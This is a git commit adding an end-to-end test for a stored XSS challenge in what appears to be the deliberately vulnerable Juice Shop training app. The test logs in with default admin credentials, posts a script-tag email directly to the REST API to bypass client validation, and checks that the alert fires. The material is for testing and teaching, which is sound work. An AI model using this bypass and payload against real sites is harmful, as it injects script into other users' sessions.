a40210f678a827322efef79b2c45b666d2480bf0
Björn Kimminich <bjoern.kimminich@gmx.de>
2014-11-01 08:37:42 +0100

    added test for xss in user registration

--- test/e2e/registerSpec.js
+++ test/e2e/registerSpec.js
@@ -4,6 +4,8 @@ describe('/#/register', function () {
 
     var email, password, passwordRepeat, registerButton;
 
+    protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});
+
     beforeEach(function () {
         browser.get('/#/register');
         email = element(by.model('user.email'));
@@ -19,10 +21,25 @@ describe('/#/register', function () {
 
     describe('challenge "xss2"', function () {
 
-        xit('should be possible to bypass validation by directly using Rest API', function () {
+        it('should be possible to bypass validation by directly using Rest API', function () {
+            browser.ignoreSynchronization = true;
+            browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.post(\'/api/Users\', {email: \'<script>alert("XSS2")</script>\', password: \'xss\'});');
+            browser.driver.sleep(1000);
+
+            browser.get('/#/administration');
+            browser.driver.sleep(1000);
+
+            browser.switchTo().alert().then(function (alert) {
+                expect(alert.getText()).toEqual('XSS2');
+                alert.accept();
+                browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.put(\'/api/Users/4\', {email: \'alert disabled\'});');
+                browser.driver.sleep(1000);
+                browser.ignoreSynchronization = false;
+            });
+
         });
 
-        //protractor.expect.challengeSolved({challenge: 'xss2'});
+        protractor.expect.challengeSolved({challenge: 'xss2'});
 
     });
 
